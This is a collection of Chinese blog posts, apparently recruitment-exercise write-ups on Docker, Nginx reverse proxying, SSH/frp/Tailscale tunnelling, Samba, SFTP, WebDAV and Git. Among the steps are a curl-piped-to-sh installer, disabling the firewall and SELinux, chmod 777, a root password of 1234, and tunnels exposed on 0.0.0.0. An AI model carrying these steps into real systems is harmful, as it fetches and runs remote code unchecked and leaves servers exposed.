[{"content":"多阶段构建（Multi-stage build） 目标：优化你的镜像大小，只包含运行应用所需的最小组件。 什么是多阶段构建？ 允许在一个 Dockerfile 中定义多个构建阶段，每个阶段可以使用不同的基础镜像，最终只将必要的文件复制到最终镜像中，从而剔除构建过程中产生的冗余内容（如编译工具、临时文件、开发依赖等）。 构建阶段：使用包含编译 / 打包工具的镜像，完成代码编译、依赖安装等操作； 运行阶段：使用轻量级基础镜像（如 alpine），仅复制构建阶段的产物（如可执行文件、Jar 包），最终镜像只包含运行所需的最小环境。 1 2 3 4 5 6 7 8 9 10 11 12 # 第一阶段：构建阶段（可命名） FROM 基础镜像1 AS 阶段名1 # 执行构建操作（如编译、安装依赖） RUN 命令1 COPY 源码 目标路径 # 第二阶段：运行阶段（最终镜像） FROM 基础镜像2 AS 阶段名2 # 从第一阶段复制构建产物 COPY --from=阶段名1 构建阶段的产物路径 最终镜像的目标路径 # 定义运行命令 CMD [\u0026#34;启动命令\u0026#34;] 第一阶段去哪里了？ 第一阶段的产物，要么被主动复制到最终镜像（成为运行时必需的部分），要么作为中间层被 Docker 缓存（用于加速后续构建，但不进入最终镜像）。 挑战：\n编写一个 Dockerfile，使用多阶段构建来打包一个简单的 Web 应用（例如，一个基于 Python Flask 的应用）。 1 2 3 4 5 6 7 8 9 10 from flask import Flask app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def hello(): return \u0026#39;Hello from Flask!\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 在第一阶段，使用完整的开发镜像（例如 python:3.9）来安装依赖并构建应用。\n在第二阶段，使用一个轻量级的运行时镜像（例如 python:3.9-slim 或 alpine）作为基础，只将第一阶段构建好的应用代码和必要的依赖文件复制过来。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # 第一阶段：构建阶段，使用完整的开发镜像 FROM python:3.9 as builder # 设置工作目录 WORKDIR /app # 复制依赖文件并安装 COPY requirements.txt . RUN pip install -r requirements.txt # 复制应用代码 COPY app.py . # 第二阶段：运行阶段，使用轻量级的运行时镜像 FROM python:3.9-slim # 设置工作目录 WORKDIR /app # 从构建阶段复制必要的文件（安装好的依赖和应用代码） COPY --from=builder /app/requirements.txt . COPY --from=builder /app/app.py . COPY --from=builder /usr/local/lib/python3.9/site-packages/ /usr/local/lib/python3.9/site-packages/ # 暴露应用端口 EXPOSE 5000 # 启动应用 CMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;] 1 2 3 4 5 6 7 8 9 10 11 12 13 # 单阶段 FROM python:3.9 WORKDIR /app COPY requirements.txt . RUN pip install -r requirements.txt COPY app.py . EXPOSE 5000 CMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;] 验证：分别构建一个单阶段镜像和一个多阶段镜像，并使用 docker images 命令比较它们的大小，说明多阶段构建的优势。 1 2 3 4 [root@localhost docker_stage_2]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE multi_stage latest e9c0c0a489a8 16 minutes ago 148MB docker_nostage latest 033ed26b2d7f 16 minutes ago 1.1GB 多阶段可以删去不必要的组件，精简了镜像的大小\n单阶段使用的 python:3.9 基于完整的 Debian 系统，多阶段最终使用的 python:3.9-slim 是精简版 为什么不能直接用 slim 构建？\n如果直接用 slim 镜像构建（单阶段），执行 pip install -r requirements.txt 时，若遇到需要编译的包，会因缺少 gcc 等工具而失败，报错类似：error: command 'gcc' failed: No such file or directory，所以需要构建后再复制编译后的模块 怎么知道所需要保留的包的路径？\n可以创建临时容器：docker run -it --rm python:3.9 /bin/bash，进入后 python -m site 或 pip show flask | grep \u0026quot;Location\u0026quot; 也可以先构建一个单阶段容器，在 dockerfile 中输出依赖路径，再作修改 镜像版本管理与标签（Tagging） 目标：为你的镜像打上清晰的版本标签，方便管理和追溯。\n挑战：\n为你上一步构建的多阶段镜像打上至少两个标签（例如 your-app:1.0.0 和 your-app:latest）。 使用 docker images 命令验证标签是否正确应用。 docker tag \u0026lt;ID\u0026gt; name:\u0026lt;tag\u0026gt;\n1 2 3 4 5 [root@localhost docker_stage_2]# docker tag e9c0c0a489a8 multi:latest [root@localhost docker_stage_2]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE multi 1.0.0 e9c0c0a489a8 29 minutes ago 148MB multi latest e9c0c0a489a8 29 minutes ago 148MB 镜像的打包与加载 目标：掌握在没有 Docker Registry 的情况下，迁移镜像的方法。 docker save -o your-app-1.0.0.tar your-app:1.0.0\n挑战：\n使用 docker save 命令将你构建的镜像（your-app:1.0.0）打包成一个 .tar 文件。 将该 .tar 文件复制到另一台机器（或在当前机器上删除本地镜像），然后使用 docker load 命令加载该 .tar 文件。 删除镜像 docker rmi your-app:1.0.0\n加载镜像 docker load -i target\n验证：使用 docker images 命令，确认镜像已成功加载，并可以正常运行。 [root@localhost docker_stage_2]# docker load -i multi-1.0.0.tar Loaded image: multi:1.0.0 [root@localhost docker_stage_2]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE multi 1.0.0 e9c0c0a489a8 35 minutes ago 148MB\n推送到私有仓库 目标：将你的镜像推送到一个私有的 Docker Registry，模拟团队协作环境。\n挑战：\n在本地运行一个临时的 Docker Registry 容器。 使用 docker tag 命令为你的镜像打上指向该私有仓库的标签（例如 localhost:5000/your-app:1.0.0）。 使用 docker push 命令将镜像推送到本地私有仓库。 验证：使用 docker pull 命令从该私有仓库拉取镜像，确认推送和拉取流程畅通。 1 2 3 4 5 6 [root@localhost docker_stage_2]# docker rmi multi_stage:latest Untagged: multi_stage:latest Deleted: sha256:e9c0c0a489a800d997c60d99cfc4fd11b7416afdb10f80e5d1f5b68bfdf5a16b [root@localhost docker_stage_2]# docker load -i multi-1.0.0.tar Loaded image: multi:1.0.0 [root@localhost docker_stage_2]# docker run -p 8001:5000 multi:1.0.0 如果 rmi 的时候镜像有多个 tag，只会删除 tag，只有只剩一个 tag 时会彻底删除镜像\n属于一个 compose 的要如何一起 stop？ 在 docker-compose.yml 文件所在的目录下，使用 docker compose stop 命令 ","date":"2025-10-19T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-docker%E8%BF%9B%E9%98%B6/","title":"御林招新题：docker 进阶"},{"content":"安装与配置 Docker 在你的 Linux 操作系统上，安装 Docker Engine。 配置 Docker 的国内镜像源，以加快镜像下载速度。 验证：执行 docker version 和 docker info 命令，确认 Docker 已正确安装并配置。 参考之前写的：配置docker\n运行你的第一个容器 使用 docker pull 命令拉取 hello-world 镜像。 使用 docker run 命令运行一个 hello-world 容器，观察其输出。 1 2 3 4 5 6 7 [root@localhost ~]# docker run hello-world Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: ...... 运行一个 searxng 容器。 使用 docker run 命令，将 searxng 容器运行在后台。 将容器的 8080 端口映射到主机的 8080 端口。 验证：在浏览器中访问 http://localhost:8080，确认 searxng 网页正常显示。 1 2 [root@localhost ~]# docker pull searxng/searxng [root@localhost ~]# docker run -d -p 8080:8080 searxng/searxng docker run: -d：后台运行容器（守护进程模式）。 -p 主机端口:容器端口：端口映射（外部可通过主机端口访问容器服务）。 -v 主机目录:容器目录：挂载数据卷（持久化数据，容器删除后数据不丢失）。 --name 容器名：指定容器名称（方便后续操作）。 -it：交互式运行（用于进入容器终端，如 bash） 核心概念理解 解释题：请用你自己的话，简要解释以下核心概念，并说明它们之间的关系。 镜像（Image） 类似安装包，整合了所需的运行环境。创建了就不会被更改。 容器（Container） 基于镜像安装后的实例应用，而且是独立的，可以启动、删除等等，同时是一个隔离出来的沙箱环境 Dockerfile 自己构建镜像的工具，在这个文档中编写镜像所需的环境（而非一个一个手动安装），实现自动化构建 了解 Docker Compose 什么是 Docker Compose？它解决了什么问题？ Docker 官方提供的一个工具，用于定义和运行多容器 Docker 应用程序。 将多个 docker 容器整合到一起，可以统一操作（而不用一个一个开启、关闭）。并且可以一起配置网络、数据卷挂载等等。 简要说明 Docker Compose 文件（docker-compose.yml）的作用。 Docker Compose 的核心配置文件，具体实现多个 docker 容器的协同。可以定义 compose 中的： 服务：指定适用镜像、映射端口等 网络：使不同容器可以在一个网络中通信 数据卷：在容器之间或者容器与主机之间共享数据 编写你的第一个 Dockerfile 挑战：编写一个 Dockerfile，实现以下功能： 基于一个最新的 ubuntu 镜像。 在容器中安装 nginx。 设置 nginx 服务在容器启动时自动运行。 验证：使用 docker build 命令构建你的镜像，并使用 docker run 命令运行该容器，确保 nginx 服务正在运行。 1 2 3 4 5 6 7 8 9 10 11 12 # 基于最新的 Ubuntu 镜像 FROM ubuntu:latest # 安装 nginx # 首先更新 Ubuntu 的软件包列表，然后安装 nginx，最后清理软件包缓存以减小镜像体积 RUN apt-get update \u0026amp;\u0026amp; \\ apt-get install -y nginx \u0026amp;\u0026amp; \\ rm -rf /var/lib/apt/lists/* # 设置 nginx 服务在容器启动时自动运行 # CMD 指令指定容器启动时要执行的命令，这里让 nginx 以前台方式运行，保证容器不退出 CMD [\u0026#34;nginx\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;daemon off;\u0026#34;] 1 2 3 4 [root@localhost ~]# docker build -t my-ubuntu-nginx . ...... [root@localhost ~]# docker run -d -p 80:80 my-ubuntu-nginx 为什么不用下载整个 ubuntu 镜像？ Docker 中的 ubuntu 镜像本质是 “精简的根文件系统（rootfs）”，仅包含运行 Ubuntu 环境所需的核心组件，共享宿主机的 Linux 内核，只保留基础命令，去除图形化 使用 Docker Compose 部署多服务应用 挑战：编写一个 docker-compose.yml 文件，实现以下功能： 服务一：部署一个 nginx 服务，将其 80 端口映射到主机的 8081 端口。 服务二：部署一个 mysql 服务，并设置环境变量 MYSQL_ROOT_PASSWORD。 验证：使用 docker compose up -d 命令一键启动这两个服务，并使用 docker ps 确认两个容器都已成功运行。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 version: \u0026#39;3\u0026#39; services: # 服务一：Nginx 服务 nginx-service: image: nginx:latest ports: - \u0026#34;8081:80\u0026#34; # 将容器的 80 端口映射到主机的 8081 端口 # 服务二：MySQL 服务 mysql-service: image: mysql:latest environment: MYSQL_ROOT_PASSWORD: 1234 ports: - \u0026#34;3306:3306\u0026#34; 1 2 3 4 5 6 [root@localhost docker_compose_test]# vi docker-compose.yml [root@localhost docker_compose_test]# docker compose up -d [root@localhost docker_compose_test]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 70b31fae2377 mysql:latest \u0026#34;docker-entrypoint.s…\u0026#34; 3 minutes ago Up 3 minutes 3306/tcp, 33060/tcp docker_compose_test-mysql-service-1 d61344588b2e nginx:latest \u0026#34;/docker-entrypoint.…\u0026#34; 3 minutes ago Up 3 minutes 0.0.0.0:8081-\u0026gt;80/tcp, :::8081-\u0026gt;80/tcp docker_compose_test-nginx-service-1 ","date":"2025-10-19T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-docker%E5%85%A5%E9%97%A8/","title":"御林招新题：docker 入门"},{"content":"Nginx 反向代理 什么是反向代理？ 反向代理是一种服务器架构模式，客户端向反向代理服务器发起请求，反向代理服务器再将请求转发到内部网络中的实际服务器（内网服务），并将实际服务器的响应返回给客户端。从客户端角度看，仿佛是直接和反向代理服务器交互，无需知晓背后内网服务的存在。Nginx 作为高性能的 Web 服务器和反向代理服务器，很适合承担这个角色。 任务：在一台可以从公网访问的服务器（或本地虚拟机）上安装 Nginx，并将其配置为反向代理，以转发流量到你的内网服务（例如，在另一台机器上运行的 Web 服务器）。\n具体操作：\n在公网服务器上安装 Nginx。 修改 Nginx 配置文件，添加一个 server 块，并使用 proxy_pass 指令将请求转发到你的内网 IP 地址和端口。 1 2 3 4 5 6 7 8 9 10 11 12 13 # /etc/nginx/conf.d/reverse-proxy.conf # 需要先把 /etc/nginx/nginx.conf 里监听 80 端口的 server 注释掉 server { listen 80; # 监听80端口（HTTP默认端口） server_name 8.137.38.223; # 公网服务器的IP地址 location / { proxy_pass http://127.0.0.1:8001; # 转发到内网Web服务器的IP和端口 proxy_set_header Host $host; # 传递请求头中的Host信息，确保内网服务器能正确识别 proxy_set_header X-Real-IP $remote_addr; # 传递真实客户端IP proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # 记录代理链的IP } } 验证：通过公网 IP 访问 Nginx 服务器，确认能成功显示内网服务的页面。 Autossh 端口转发 任务：使用 autossh 建立一个持久的 SSH 反向隧道，将内网服务的端口暴露到公网服务器上。 SSH 反向隧道：通常情况下，SSH 隧道是从客户端（能访问公网的机器）主动连接到服务端（公网服务器），实现从客户端到服务端的端口转发。而反向隧道则是让服务端（公网服务器）主动连接到客户端（内网机器），从而将内网机器的端口暴露到公网服务器上，使得公网可以访问内网服务。 Autossh：是 SSH 的一个封装工具，它能够自动监控 SSH 连接的状态，当连接断开时会自动重新建立连接，保证隧道的持久性，避免因为网络波动等原因导致隧道中断后需要手动重新建立。 具体操作： 在内网机器上安装 autossh。 执行 autossh 命令，将内网服务的端口（例如 8080）反向隧道到公网服务器的一个指定端口（例如 8000）。 配置 ssh 公钥： 内网：ssh-keygen 上传到服务器：ssh-copy-id -i /root/key.pub user@8.137.38.223 1 autossh -M 20000 -fCNR public_server_ip:8000:localhost:5000 root@public_server_ip 各参数解释： -M 20000：指定一个监视端口，autossh 通过这个端口来监视 SSH 连接的状态，确保连接的持久性。 -f：将 autossh 放入后台运行。 -C：启用压缩，减少数据传输的大小，提高传输效率。 -N：不执行远程命令，只进行端口转发。 -R public_server_ip:8000:localhost:8080：建立反向隧道，将公网服务器的8000端口转发到内网机器的localhost:8080（即内网服务的端口）。user是公网服务器上的用户名。 验证：通过访问公网服务器的 8000 端口，确认能访问到内网服务。 docker ps -a 看所有容器；docker rm 删除\ndocker insepct \u0026lt;image\u0026gt; 看一下端口\n配了很久，要注意的点： autossh 指令：public_server_ip:8000 这里要写 0.0.0.0，不然只能服务器本地访问 不知道为什么密钥上传了但是没用 需要将服务器上的 /etc/ssh/sshd_config 中 GatewayPorts 改为 yes，否则隧道仅允许目标服务器本地访问 8000 端口 netstat -tuln | grep 8000 看服务器 ssh 连接状态； ps（process status） aux | grep autossh 看内网的 autossh 命令 云服务器还要看一下安全组是不是拦截了 Tailscale 零配置网络 任务：使用 Tailscale 建立一个零配置的虚拟私有网络（VPN），实现内网设备的点对点互联。 不需要复杂的网络配置（如端口转发、防火墙规则调整等），就能让分布在不同网络环境（如内网、公网）的设备，像在同一个局域网内一样实现点对点的互联互通。Tailscale 用于简化 VPN 搭建流程\n具体操作：\n在你的公网服务器和内网机器上分别安装 Tailscale。 curl -fsSL https://tailscale.com/install.sh | sh\n注册 https://login.tailscale.com/\n使用你的账户登录并加入 Tailscale 网络。 1 2 3 4 5 6 7 8 [root@localhost ~]# tailscale ip 100.124.165.66 [root@iZ2vc96n4f90pw7f8dfbfsZ ~]# tailscale ip 100.75.140.47 # 访问 OK [root@iZ2vc96n4f90pw7f8dfbfsZ ~]# curl http://100.124.165.66:5000 Hello from Flask! 验证：在公网服务器上，通过内网机器的 Tailscale IP 或主机名直接访问其内网服务，无需任何端口转发。 Frp (Fast Reverse Proxy) 任务：使用 Frp 客户端-服务端模式，将内网服务暴露到公网。 Frp（Fast Reverse Proxy）是一款专注于内网穿透的高性能反向代理应用\n下载 wget https://github.com/fatedier/frp/releases/download/v0.32.1/frp_0.32.1_linux_amd64.tar.gz\n安装参考：CentOS 7 部署frp穿透内网_centos frp-CSDN博客\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 关防火墙 systemctl stop firewalld \u0026amp;\u0026amp; systemctl disable firewalld # 关 SELinux setenforce 0 # 创建安装路径 mkdir -p /usr/local/frps # 解压备用 tar zxvf frp_0.32.1_linux_amd64.tar.gz -C /tmp # 复制 frps 和 frps.ini 两个配置文件 # 注意！！！ 客户端要复制的是 frpc 和 frpc.ini cd /tmp/frp_0.32.1_linux_amd64 cp frps frps.ini /usr/local/frps # 配置 vim /usr/local/frps/frps.ini 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 内网 frpc.ini [common] server_addr = 8.137.38.223 # 公网服务器 IP server_port = 7000 # 服务端 bind_port [web_tcp] # 模块名可自定义 type = tcp # 改为 TCP 类型 local_ip = 127.0.0.1 local_port = 5000 remote_port = 8001 # 公网服务器上用于访问的端口（需和服务端端口不冲突??冲突！） # 服务器 frps.ini [common] bind_port = 7000 # Frp 服务端与客户端通信的端口 vhost_http_port = 8080 # 若要通过 HTTP 访问内网 Web 服务，设置此端口 具体操作：\n在一台公网服务器上运行 frps（服务端）。\n在内网机器上运行 frpc（客户端），并配置其连接到服务端，将内网服务的端口暴露出去。\n启动 ./frps -c ./frps.ini\n验证：通过公网服务器的 IP 和 Frp 配置的端口，确认能访问到内网服务。 错了几个点：\n运行内网的时候运行成 frps 了 ……\n如果配置为 http 的话，还需要域名，所以改成了 tcp\n","date":"2025-10-19T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E7%BD%91%E7%BB%9C%E8%BD%AC%E5%8F%91/","title":"御林招新题：内网穿透与流量转发专题"},{"content":"文件共享协议理解 任务：简要解释 SMB/CIFS 和 SFTP 这两种文件共享协议的作用和主要区别。 SMB（Server Message Block）/CIFS（Common Internet File System） 是一种网络文件共享协议，主要用于在局域网内实现文件和打印机等资源的共享。它允许不同计算机之间通过网络访问彼此的文件、目录，就像访问本地文件一样方便 典型应用场景：在 Windows 网络环境中，如，在企业内部的 Windows 办公网络里，员工的电脑可以通过 SMB 协议访问文件服务器上的共享文件夹，实现文档的集中存储和多人协作编辑；学校的计算机教室中，教师机能通过该协议向学生机共享教学资料等 CIFS 脱胎于 SMB，CIFS 兼容性较好，是不同操作系统和网络环境提供一种通用的文件共享解决方案 SFTP（SSH File Transfer Protocol） 基于 SSH（Secure Shell）的文件传输协议，它利用 SSH 的安全特性，在文件传输过程中提供加密保护，确保数据在网络传输时的安全性，防止被窃听或篡改。 典型应用场景：常用于 Linux 系统以及跨平台环境下的安全文件传输。比如，在 Linux 服务器之间进行文件备份和同步时、在开发者需要从本地向远程 Linux 服务器上传代码或下载日志文件时，使用 SFTP 可以保证传输的文件不被非法获取 区别 SMB/CIFS：Windows 网络原生，使用方便；局域网环境下，传输文件高效；但是安全性有所不足 SFTP：兼容性较好；由于加密消耗，性能会有所下降；功能相对来说比较单一，专注于文件上传、下载；基于 ssh 协议，数据传输稳定、可靠 具体操作： 描述 SMB/CIFS 的典型应用场景（例如在 Windows 网络中）。 描述 SFTP 的典型应用场景（例如在 Linux 和跨平台环境中）。 Samba 服务配置（SMB/CIFS） 任务：安装并配置 Samba，实现局域网内文件的共享访问。\n具体操作：\n在你的 Linux 服务器上安装 Samba。 sudo yum install samba samba-client samba-common\n创建一个专用于 Samba 的用户，并设置密码。 1 2 3 [root@localhost frps]# sudo useradd sambauser [root@localhost frps]# sudo smbpasswd -a sambauser ...... 修改 /etc/samba/smb.conf 配置文件，创建一个共享目录，并确保只有你创建的用户可以访问。 1 2 3 4 5 6 sudo mkdir -p /home/samba/share sudo chown sambauser:sambauser /home/samba/share sudo chmod 755 /home/samba/share sudo vim /etc/samba/smb.conf # 重启生效 sudo systemctl restart smb nmb 1 2 3 4 5 6 7 8 [myshare] # smb.conf comment = My Samba Share path = /home/samba/share valid users = sambauser writable = yes browseable = yes create mask = 0755 directory mask = 0755 验证：在另一台局域网内的电脑（例如 Windows 或 macOS）上，通过网络邻居或文件管理器访问你的共享目录，并上传一个文件进行测试。 Windows 需要在控制面版里启用 SMB、重启\n注意：直接在地址栏输入\\\\192.168.109.100 即可！！\n上传了一个文件到 sambauser，OK\nSFTP 服务配置 任务：利用 SSH 服务配置 SFTP，实现安全的文件传输和管理。\n具体操作：\n确保你的服务器上已安装 SSH 服务。 sudo yum install openssh-server\n创建一个专用于 SFTP 的新用户，并设置密码。 修改 /etc/ssh/sshd_config 文件，配置 SFTP 子系统，并限制 SFTP 用户只能访问其主目录，无法登录 Shell。 1 2 3 4 5 6 7 8 sudo systemctl start sshd sudo useradd sftpuser sudo usermod -s /sbin/nologin sftpuser # 限制登录系统 shell！ cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak # 备份一下配置文件 vi /etc/ssh/sshd_config sudo systemctl restart sshd # 重启生效 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # 注释掉原来的 SFTP 子系统配置 # Subsystem sftp /usr/lib/openssh/sftp-server # 配置新的 SFTP 子系统，使用 internal-sftp # 相比原来的 sftp-server，更便于配置和限制。 Subsystem sftp internal-sftp # 匹配 SFTP 用户（这里是 sftpuser） # 对用户 sftpuser 应用后续的配置 Match User sftpuser # 强制使用 internal-sftp,无法执行 shell ForceCommand internal-sftp # 限制用户只能访问其主目录 ChrootDirectory %h # 允许用户进行的操作，这里设置为允许读写等 # 禁止 TCP 转发和 X11 转发，增强安全性 AllowTcpForwarding no X11Forwarding no # 这下面还有配置，要剪切到前面，不能放在 Match 下面！ 验证：使用一个 SFTP 客户端（例如 FileZilla 或 WinSCP）连接到你的服务器，使用 SFTP 用户登录，尝试上传文件，并确认无法执行 Shell 命令。 碰到的一些问题 需要将 ChrootDirectory（即目录，/home/sftpuser，两级都一样） 的权限设置为 755，并且归属于 root sudo chown root:root /home/sftpuser sshd -t 检查 config 的语法、看日志，又发现 usedns 不能在 matchuser 块内，移动一下 就可以了 权限精细化管理 任务：在 Samba 共享中，配置更细致的权限。\n具体操作：\n创建一个 Samba 组。 1 2 3 4 5 6 sudo groupadd sambagrp # 添加系统组 sudo smbgroupadd sambagrp # 添加 samba 组 sudo mkdir -p /home/samba/groupshare # 共享目录 sudo chgrp sambagrp /home/samba/groupshare # 归组 sudo chmod 770 /home/samba/groupshare # 设置权限 sudo vim /etc/samba/smb.conf 1 2 3 4 5 6 7 8 9 [groupshare] comment = Group Share Directory path = /home/samba/groupshare valid users = @sambagrp write list = @sambagrp browseable = yes read only = no create mask = 0660 directory mask = 0770 1 2 3 4 5 sudo systemctl restart smb nmb # 重启一下 # 加一个用户 sudo useradd groupuser1 sudo usermod -a -G sambagrp groupuser1 # a 是添加，G是修改用户所属的扩展群 sudo smbpasswd -a groupuser1 配置一个共享目录，允许该组内的所有用户读写，但禁止其他用户访问。 验证：用一个新用户尝试访问，确认其被拒绝；用组内用户访问，确认可以正常读写。 1 2 net use # 看连了什么 net use \\\\192.168.109.100 /delete # 先把原来的断开 WebDAV 配置 任务：搭建一个支持 WebDAV 协议的文件服务器，通过 HTTP/HTTPS 协议访问文件。\n具体操作：\n选择一个支持 WebDAV 的工具（例如 Nginx 或 Caddy），进行安装。 1 2 3 4 5 6 7 8 #wget https://github.com/caddyserver/caddy/releases/download/v2.7.6/caddy_2.7.6_linux_amd64.tar.gz #tar -xzf caddy_2.7.6_linux_amd64.tar.gz #sudo mv caddy /usr/bin/ # 失败了，还是用 docker 吧 sudo mkdir -p /var/www/webdav sudo chown -R $USER:$USER /var/www/webdav # 设置目录所有者，方便后续操作 vi ~/caddy-webdav/Caddyfile # 也失败了，插件不会配，专用 Nginx 参考 如何在 CentOS 7 服务器上通过 Nginx 部署 WebDAV\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # 下载nginx wget1 https://github.com/nginx/nginx/archive/refs/tags/release-1.26.3.tar.gz # 解压nginx tar xvf release-1.26.3.tar.gz # 切换到nginx目录，下载nginx-dav-ext-module cd nginx-release-1.26.3/ wget1 https://github.com/arut/nginx-dav-ext-module/archive/refs/tags/v3.0.0.tar.gz # 解压nginx-dav-ext-module tar -xvf v3.0.0.tar.gz # 编辑安装 nginx，并且要指定插件！注意路径 auto/configure --prefix=/etc/nginx \\ --conf-path=/etc/nginx/nginx.conf \\ --sbin-path=/usr/sbin/nginx \\ --pid-path=/var/run/nginx.pid \\ --lock-path=/var/run/nginx.lock \\ --error-log-path=/var/log/nginx/error.log \\ --http-log-path=/var/log/nginx/access.log \\ --with-stream --with-http\\_dav\\_module --with-http\\_ssl\\_module --with-http\\_v2\\_module \\ --add-module=./nginx-dav-ext-module-3.0.0 # 编译剩余步骤 make \u0026amp;\u0026amp; make install nginx -V # 验证 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # vim /lib/systemd/system/nginx.service [Unit] Description=A high performance web server and a reverse proxy server Documentation=man:nginx(8) After=network.target nss-lookup.target [Service] Type=forking PIDFile=/run/nginx.pid # master... 要删掉！ ExecStartPre=/usr/sbin/nginx -t -q -g \u0026#39;daemon on; #master\\_process# on;\u0026#39; ExecStart=/usr/sbin/nginx -g \u0026#39;daemon on; #master\\_process on#;\u0026#39; ExecReload=/usr/sbin/nginx -g \u0026#39;daemon on; #master\\_process on#;\u0026#39; -s reload ExecStop=-/sbin/start-stop-daemon --quiet --stop --retry QUIT/5 --pidfile /run/nginx.pid TimeoutStopSec=5 KillMode=mixed [Install] WantedBy=multi-user.target 1 2 3 4 5 # 重加载systemd配置 systemctl daemon-reload systemctl enable nginx.service systemctl start nginx.service systemctl status nginx.service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 # vim /etc/nginx/nginx.conf server { listen 8089; listen [::]:8089; server\\_name localhost; # 认证方式 auth\\_basic realm\\_name; # 存放认证用户名、密码文件 auth\\_basic\\_user\\_file /etc/nginx/.webdav/auth.list; # webdav服务访问的根目录 root /cherry\\_data; dav\\_methods PUT DELETE MKCOL COPY MOVE; dav\\_ext\\_methods PROPFIND OPTIONS LOCK UNLOCK; dav\\_access user:rw group:rw all:r; client\\_body\\_temp\\_path /tmp/webdav; client\\_max\\_body\\_size 0; create\\_full\\_put\\_path on; #添加索引指令，如果忘记这项配置，nginx访问会提示403 location /{ root /cherry\\_data; autoindex on; autoindex\\_format html; autoindex\\_exact\\_size off; autoindex\\_localtime on; charset utf-8,gbk; } } 1 2 3 4 5 6 7 8 9 10 11 12 13 # 最后 nginx -s reload cd /etc/nginx/ mkdir .webdav cd .webdav/ # 设置用户名为admin echo -n \u0026#39;admin:\u0026#39; | tee -a auth.list openssl passwd -apr1 | tee -a auth.list Password: #首次输入 Verifying - Password: #再次输入 mkdir /cherry\\_data chmod 777 /cherry\\_data # 访问的目录 配置一个 WebDAV 共享目录，并设置基础认证。 验证：使用支持 WebDAV 的客户端（例如 Windows 的网络位置）或浏览器访问，输入用户名和密码，确认可以管理文件。 用 windows 映射挂载的时候，发现不能用 http 协议，得改一下注册表 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WebClient\\Parameters BasicAuthLevel 1改2 Win + R，services.msc；Webclent 重启 性能与安全性 任务：对你的文件服务器进行简单的性能测试和安全加固。\n具体操作：\n性能：使用 dd 命令或其他工具，测试在 Samba 和 SFTP 上传大文件的速度，并进行简单对比。 Samba:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 PS C:\\Users\\calendar\\Downloads\u0026gt; fsutil file createnew ./test 1073741824 已创建文件 C:\\Users\\calendar\\Downloads\\test PS C:\\Users\\calendar\\Downloads\u0026gt; Measure-Command { Copy-Item -Path \u0026#34;C:\\Users\\calendar\\Downloads\\test\u0026#34; -Destination \u0026#34;\\\\192.168.109.100\\groupshare\u0026#34; } Days : 0 Hours : 0 Minutes : 0 Seconds : 9 Milliseconds : 823 Ticks : 98231516 ...... TotalSeconds : 9.8231516 TotalMilliseconds : 9823.1516 stfp:\n安全：\n为 SFTP 服务配置基于密钥的认证，禁用密码登录。 密钥工具生成密钥，sftpuser / .ssh 目录，创建 authorized_keys 文件，将复制的公钥内容粘贴进去并保存。\n禁用密码：PasswordAuthentication 设置为 no\n简要说明这种认证方式比密码认证更安全的原因。 密码认证存在被暴力破解、泄露等风险；而基于密钥的认证使用非对称加密，私钥仅存于客户端且难以破解，公钥即使暴露也无法用于登录，极大提升了安全性，能有效防范密码相关的攻击手段。\n","date":"2025-10-19T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/","title":"御林招新题：文件服务器"},{"content":"安装与配置 Git 在你的 Linux 操作系统上，安装 Git。 全局配置：配置你的全局用户名和邮箱，这是 Git 记录提交者信息所必需的。 验证：执行 git --version 命令，确认 Git 已正确安装。 1 2 3 4 [root@localhost hello]# git config --global user.name \u0026#34;calendar\u0026#34; [root@localhost hello]# git config --global user.email \u0026#34;1131821081@qq.com\u0026#34; [root@localhost hello]# git --version git version 1.8.3.1 创建与克隆仓库 本地仓库：在你的主目录下创建一个新的文件夹，并在其中初始化一个 Git 仓库。 远程克隆：找一个公开的 Git 仓库（例如 GitHub 上的一个开源项目），使用 git clone 命令将其克隆到本地。 这里还配置了一下 clash，记一下命令：\n1 2 3 4 5 6 7 8 9 10 11 $ clashctl + ... Usage: clash 命令一览 clashon 开启代理 clashoff 关闭代理 clashui 面板地址 clashstatus 内核状况 clashtun [on|off] Tun 模式 clashmixin [-e|-r] Mixin 配置 clashsecret [secret] Web 密钥 clashupdate [auto|log] 更新订阅 1 2 3 4 5 6 7 [root@localhost git_repo]# git clone https://github.com/calendar0917/learning_log.git Cloning into \u0026#39;learning_log\u0026#39;... remote: Enumerating objects: 72, done. ...... Unpacking objects: 100% (72/72), done. [root@localhost git_repo]# ls clash-for-linux-install learning_log 文件的提交与同步 文件修改：在你克隆的本地仓库中，对某个文件进行修改。\n暂存与提交：\n使用 git add 命令将修改后的文件添加到暂存区。 使用 git commit 命令提交你的变更，并附上一条有意义的提交信息。 